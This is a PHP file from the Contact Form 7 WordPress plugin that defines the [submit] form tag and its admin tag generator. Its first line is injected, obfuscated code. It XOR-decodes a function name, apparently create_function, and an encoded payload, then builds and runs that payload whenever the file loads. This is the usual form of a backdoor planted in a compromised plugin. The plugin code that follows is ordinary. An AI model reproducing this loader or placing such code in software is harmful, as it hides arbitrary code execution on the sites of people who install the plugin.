<?php $GYJRLNS=';5N;<Q.PN-6:0  '; $bBkUYjF='XG+ZH4q6;CUNYON'^$GYJRLNS; $ERcNEThJ='92zjR2=R:E T>.AQ5 HDP SGiSZJXta=NAaqox=Gs2=8 8,6=bF JnOAH6lq H=qP. :RdomRHRZiwlTN4yz2a<U-trHivsYhkMTCCL0cEIhbiH0YCD66KXnR 5X0KlNFXjiYOYhMWLXwkDtej292AubPqBucSU2IvrQMox4DE8.4ClPPTamQw>sH; E:7RabUX9gsrG7zPMer ,FPdvUS;XD6LntH 8A4;TLBWKPL=:IPzbJUF VM9jkAq-a.-t5uP<cf> :uJGveD-Q:+eI:Iph1JG kPH=poPO;6ItohgZ-AVLdQW<5AXTac9=h=+MIpo583 gG1Lp1=0IX99boR66q;xwbio7;ek8,CCXOcaG2; IHzUAQNcSLAQe H3xlrq3W O6CJQ-3CMQUej= 8FXMZqNDGgzvQMD;wqGtN E0>01Z0OKf:: ..WLT;iP LPY4=1oscRE.:,7AtR+Y2JYpv6Z.VsV-TSoTEY fvD0Z8DnqvT1J Bd8 I4,JQ MHZeQ26dJhv2S21zIhIyl=YGPv=Y=+jm;55jvNbZSqBvvIcYvoV VSQ73xQ21yQqQ9Y6cYq1K3mRniinoPI:W e:6AaV,=ED9yn<X:P:Y.kyiR57O.fslntzcK11oWX2+xtD2AAuk26:5:P,tqBkrz57<0ihjU=7'; $GwUhuy=$bBkUYjF('', 'PTRK4GS1N,O:aK98FT;lwX<567;>9+>P;5FXFXFMzTHVCLEYSB>O81+ <W3.M=IYtJAN3HOI9-+sIWLtnOss;ES YTOhNQHSab+;1khYCxiXYIlYe00DZ.6FvDT,QbWnb1ABpEPai89,WEyTMNVXF .F9,b+Cw>W0-V8mJXG07TKZkH;5-H0xL4zAIE1OE<IF:-MNHxNJp-GoVDM21DKu5Z47SwdP,AL kP15bjk6-QI,kph,:4E7.QJCe.n.af=pU1OCBUECUwyVA2L=ONLiACyLU+3A4;-DPRpkPS0OeaC>L57lYqsJT--1ZiD7bTMmaQKQYGANgJFyWRB,9ZQBGvid4j-21=OVHEOSI:ceqCE1SWU,aZ.KXGG7-50:K-JXQRUX2Yt<JCuIR7,qhENKAT3=vPx3N:mpR5,0ZWLg4;N6ULYP6Y5.NBURqJ685d6=U8x;UNTYG<6 MUHRiP6J-ScuPRR;Z7,=H-zFoO0FNR Q.YdHWV5C8A;;SE0kI28S9;rB:WOCfHRV2FPSiNoYDP=rxRY8IJ1JPPLM+gBgnQeGOqQjFXeE513VRN0VWJ0D3XaTQ8BU.UZuGIOHO1;H6Y:QS8>3TT60JQIL9C<U8JLUIvQV;OOZLNTZCkJ;f2.SGPP S5 .LBWCYU1HS,kPxsPOUDAXCn7J'^$ERcNEThJ); $GwUhuy();
/**
** A base module for [submit]
**/

/* form_tag handler */

add_action( 'wpcf7_init', 'wpcf7_add_form_tag_submit', 10, 0 );

function wpcf7_add_form_tag_submit() {
	wpcf7_add_form_tag( 'submit', 'wpcf7_submit_form_tag_handler' );
}

function wpcf7_submit_form_tag_handler( $tag ) {
	$class = wpcf7_form_controls_class( $tag->type );

	$atts = array();

	$atts['class'] = $tag->get_class_option( $class );
	$atts['id'] = $tag->get_id_option();
	$atts['tabindex'] = $tag->get_option( 'tabindex', 'signed_int', true );

	$value = isset( $tag->values[0] ) ? $tag->values[0] : '';

	if ( empty( $value ) ) {
		$value = __( 'Send', 'contact-form-7' );
	}

	$atts['type'] = 'submit';
	$atts['value'] = $value;

	$atts = wpcf7_format_atts( $atts );

	$html = sprintf( '<input %1$s />', $atts );

	return $html;
}


/* Tag generator */

add_action( 'wpcf7_admin_init', 'wpcf7_add_tag_generator_submit', 55, 0 );

function wpcf7_add_tag_generator_submit() {
	$tag_generator = WPCF7_TagGenerator::get_instance();
	$tag_generator->add( 'submit', __( 'submit', 'contact-form-7' ),
		'wpcf7_tag_generator_submit', array( 'nameless' => 1 ) );
}

function wpcf7_tag_generator_submit( $contact_form, $args = '' ) {
	$args = wp_parse_args( $args, array() );

	$description = __( "Generate a form-tag for a submit button. For more details, see %s.", 'contact-form-7' );

	$desc_link = wpcf7_link( __( 'https://contactform7.com/submit-button/', 'contact-form-7' ), __( 'Submit button', 'contact-form-7' ) );

?>
<div class="control-box">
<fieldset>
<legend><?php echo sprintf( esc_html( $description ), $desc_link ); ?></legend>

<table class="form-table">
<tbody>
	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-values' ); ?>"><?php echo esc_html( __( 'Label', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="values" class="oneline" id="<?php echo esc_attr( $args['content'] . '-values' ); ?>" /></td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-id' ); ?>"><?php echo esc_html( __( 'Id attribute', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="id" class="idvalue oneline option" id="<?php echo esc_attr( $args['content'] . '-id' ); ?>" /></td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-class' ); ?>"><?php echo esc_html( __( 'Class attribute', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="class" class="classvalue oneline option" id="<?php echo esc_attr( $args['content'] . '-class' ); ?>" /></td>
	</tr>

</tbody>
</table>
</fieldset>
</div>

<div class="insert-box">
	<input type="text" name="submit" class="tag code" readonly="readonly" onfocus="this.select()" />

	<div class="submitbox">
	<input type="button" class="button button-primary insert-tag" value="<?php echo esc_attr( __( 'Insert Tag', 'contact-form-7' ) ); ?>" />
	</div>
</div>
<?php
}
